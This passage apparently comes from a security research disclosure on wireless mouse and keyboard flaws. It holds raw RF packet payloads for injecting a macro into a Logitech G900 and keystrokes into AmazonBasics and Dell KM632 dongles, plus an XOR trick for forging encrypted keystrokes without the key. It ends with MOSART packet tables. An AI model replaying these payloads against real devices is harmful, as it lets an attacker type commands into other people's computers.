22
15
19:D3:AC:21:08
00 11 07 0E 7F FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 6B
16
19:D3:AC:21:08
00 51 01 0E 7F 00 07 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1A
17
19:D3:AC:21:08
00 11 07 0E 7F FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 6B
18
19:D3:AC:21:08
00 51 01 0E 7F 00 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 19
19
19:D3:AC:21:08
00 11 07 0E 7F FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 6B
20
19:D3:AC:21:08
00 51 01 0E 7F 00 09 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18
21
19:D3:AC:21:08
00 11 07 0E 7F FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 6B
22
19:D3:AC:21:08
00 51 01 0E 7F 00 0A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 17
23
19:D3:AC:21:08
00 11 07 0E 7F FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 6B
24
19:D3:AC:21:08
00 51 01 0E 7F 00 0B 00 00 00 00 00 00 00 00 00 00 00 00 00 00 16
25
19:D3:AC:21:08
00 11 07 0E 7F FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 6B
26
19:D3:AC:21:08
00 51 01 0E 7F 00 0C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 15
27
19:D3:AC:21:08
00 11 07 0E 7F FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 6B
28
19:D3:AC:21:08
00 51 01 0E 7F 00 0D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 14
29
19:D3:AC:21:08
00 11 07 0E 7F FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 6B
30
19:D3:AC:21:08
00 51 01 0E 7F 00 0E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 13
31
19:D3:AC:21:08
00 11 07 0E 7F FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 6B
32
19:D3:AC:21:08
00 51 01 0E 7F 00 0F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 12
33
19:D3:AC:21:08
00 11 07 0E 7F FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 6B
34
19:D3:AC:21:08
00 51 01 0E 7F 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 11
35
19:D3:AC:21:08
00 10 07 0E 8F 00 00 00 00 4C
The odd numbered packets are ACK payloads going from the attacker’s transmitter to the mouse, and the even
numbered payloads are response packets transmitted by the mouse. In this example, packets 3 and 5 contain the
HID scan code information for key down and up events for keys ’a’, ’b’, and ’c’.
The speciﬁc mouse button assigned to a macro is deﬁned in a conﬁguration block that describes various mouse
conﬁguration properties. Two of the packets in this block describe the mouse button assignments.
23
1
19:D3:AC:21:08
00 11 07 0E 7F 80 01 00 01 80 01 00 02 80 01 00 04 00 06 00 00 CB
Assign the ﬁrst macro to the ’back’ button (1 of 2), transmitted from a malicious device to a G900 mouse
at address 19:D3:AC:21:08. Packet format is described in ﬁgure ??.
2
19:D3:AC:21:08
00 11 07 0E 7F 80 01 00 10 80 01 00 08 80 01 00 10 90 04 FF FF 1E
Assign the ﬁrst macro to the ’back’ button (2 of 2), transmitted from a malicious device to a G900 mouse
at address 19:D3:AC:21:08. Packet format is described in ﬁgure ??.
7
Chicony
Chicony is the OEM which manufacturers the AmazonBasics wireless keyboard and mouse, along with the Dell
KM632 wireless keyboard and mouse.
Radio Conﬁguration
Channels (MHz)
2403-2480, 1MHz spacing
Data Rate
2Mbps (2MHz GFSK)
Address Length
5 bytes
CRC Length
2 bytes
Table 18: Chicony radio conﬁguration
7.1
Vulnerabilities
7.1.1
Unencrypted Keystroke Injection - AmazonBasics (BN-0007)
It is possible to transmit a specially crafted RF packet to the RF address of a Dell KM632 mouse, causing the
dongle to send keyboard HID packets to the host operating system.
Transmitting the following three payloads to the RF address of an AmazonBasics wireless mouse will generate an
’a’ keypress (HID scan code: 04):
1
XX:XX:XX:XX:XX
0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F
2
XX:XX:XX:XX:XX
0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:00:00:00:04:00
3
XX:XX:XX:XX:XX
0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F
7.1.2
Unencrypted Keystroke Injection - Dell KM632 (BN-0007)
It is possible to transmit a specially crafted RF packet to the RF address of a Dell KM632 mouse, causing the
dongle to send keyboard HID packets to the host operating system.
Transmitting the following two payloads to the RF address of a Dell KM632 wireless mouse will generate an ’a’
keypress (HID scan code: 04):
1
XX:XX:XX:XX:XX
06:00:04:00:00:00:00:00:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:00:00:00
2
XX:XX:XX:XX:XX
06:00:00:00:00:00:00:00:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:0F:00:00:00
24
7.1.3
Encrypted Keystroke Injection - AmazonBasics (BN-0013)
The AmazonBasics keyboard encrypts RF packets, but the implementation makes it possible to infer the cipher-
text and inject malicious keystrokes.
An ’a’ keypress causes the following two RF packets to be transmitted from the keyboard to the dongle:
B9 D6 00 8E E8 7C 74 3C BD 38 85 55 92 78 01 // ’a’ key down
D0 E4 6F 75 C9 D1 53 30 39 7B AD BC 44 B1 F6 // ’a’ key up
Octets 0 and 2-7 are octets 0 and 2-7 of a keyboard HID packet XOR’d with ciphertext. The value of octet 1
does not appear to have any e↵ect on the resulting HID packet.
The unencrypted octets 0 and 2-7 are as follows. Octet 1 in the HID packet is always 0x00.
00 XX 04 00 00 00 00 // ’a’ key down
00 XX 00 00 00 00 00 // ’a’ key up
Due to the fact that a ’key up’ keyboard HID packet consists of all 0x00 bytes, one can infer that octets 0 and 2-
7 of the second packet represent unaltered ciphertext.
Using this knowledge, it is possible to inject arbitrary encrypted keystrokes without knowledge of the encryption
key.
In this scenario, transmitting the following two RF packets will cause a ’b’ keystroke to be sent to the host com-
puter:
D0 E4 6A 75 C9 D1 53 30 39 7B AD BC 44 B1 F6 // ’b’ key down
D0 E4 6F 75 C9 D1 53 30 39 7B AD BC 44 B1 F6 // ’b’ key up
Octet 2 of the ﬁrst packet has been XOR’d with 0x05, the HID scan code for ’b’. The second packet is the un-
changed ’key up’ packet previously observed.
7.1.4
Encrypted Keystroke Injection - Dell KM632 (BN-0013)
Dell KM632 keyboard encrypts RF packets, but the implementation makes it possible to infer the ciphertext and
inject malicious keystrokes.
An ’a’ keypress causes the following two RF packets to be transmitted from the keyboard to the dongle:
CD 38 09 E1 86 6D D7 DE 0E 20 F7 F2 E6 68 67 // ’a’ key down
D4 D5 16 E9 E8 5A 59 BE DD 41 D0 9A 06 B4 42 // ’a’ key up
Octets 0 and 2-7 are octets 0 and 2-7 of a keyboard HID packet XOR’d with ciphertext. The value of octet 1
does not appear to have any e↵ect on the resulting HID packet.
The unencrypted octets 0 and 2-7 are as follows. Octet 1 in the HID packet is always 0x00.
00 XX 04 00 00 00 00 // ’a’ key down
00 XX 00 00 00 00 00 // ’a’ key up
Due to the fact that a ’key up’ keyboard HID packet consists of all 0x00 bytes, one can infer that octets 0 and
2-7 of the second packet represent unaltered ciphertext.
Using this knowledge, it is possible to inject arbitrary encrypted keystrokes without knowledge of the encryption
key.
In this scenario, transmitting the following two RF packets will cause a ’b’ keystroke to be sent to the host com-
puter:
D4 D5 13 E9 E8 5A 59 BE DD 41 D0 9A 06 B4 42 // ’b’ key down
D4 D5 16 E9 E8 5A 59 BE DD 41 D0 9A 06 B4 42 // ’b’ key up
25
Octet 2 of the ﬁrst packet has been XOR’d with 0x05, the HID scan code for ’b’. The second packet is the un-
changed ’key up’ packet previously observed.
8
MOSART
MOSART Semiconductor produces unencrypted transceivers for use in wireless mice and keyboards. MOSART-
based products from each vendor functioned identically, so it is assumed that there is no vendor customization
available.
Preamble
2 bytes
Address
4 bytes
Frame Type
4 bits
Sequence Number
4 bits
Payload
3-5 bytes
CRC
2 bytes
Postamble
1 byte
(MOSART)
Figure 7: MOSART packet format
Radio Conﬁguration
Channels (MHz)
2402-2480, 2MHz spacing
Data Rate
1Mbps (1MHz GFSK)
Address Length
4 bytes
CRC Length
2 bytes, CRC-16 XMODEM
Payload Whitening
0x5A (repeated)
Table 19: MOSART radio conﬁguration
MOSART Movement Packet
Field
Length
Description
Preamble
2 bytes
AA:AA
Address
4 bytes
Frame Type
4 bits
0x04
Sequence Number
4 bits
X1
1 byte
X movement for 1 of 2 possible concatenated movement packets
X2
1 byte
X movement for 2 of 2 possible concatenated movement packets
Y1
1 byte
Y movement for 1 of 2 possible concatenated movement packets
Y2
1 byte
Y movement for 2 of 2 possible concatenated movement packets
CRC
2 bytes
CRC-16 XMODEM
Postamble
1 byte
FF
Table 20: MOSART Movement Packet
26
MOSART Scroll Packet
Field
Length
Description
Preamble
2 bytes
AA:AA
Address
4 bytes
Frame Type
4 bits
0x07
Sequence Number
4 bits
Button State
1 byte
0x81
Button Type
4 bits
0x0F
Scroll Motion
4 bits
0x0F: down, 0x01: up
CRC
2 bytes
CRC-16 XMODEM
Postamble
1 byte
FF
Table 21: MOSART Scroll Packet
MOSART Click Packet
Field
Length
Description
Preamble
2 bytes
AA:AA
Address
4 bytes
Frame Type
4 bits
0x07
Sequence Number
4 bits
Button State
1 byte
0x81 (down) or 0x01 (up)
Button Type
4 bits
0x0A
Button
4 bits
CRC
2 bytes
CRC-16 XMODEM
Postamble
1 byte
FF
Table 22: MOSART Click Packet
27
MOSART Keypress Packet
Field
Length
Description
Preamble
2 bytes
AA:AA
Address
4 bytes
Frame Type
4 bits
0x07
Sequence Number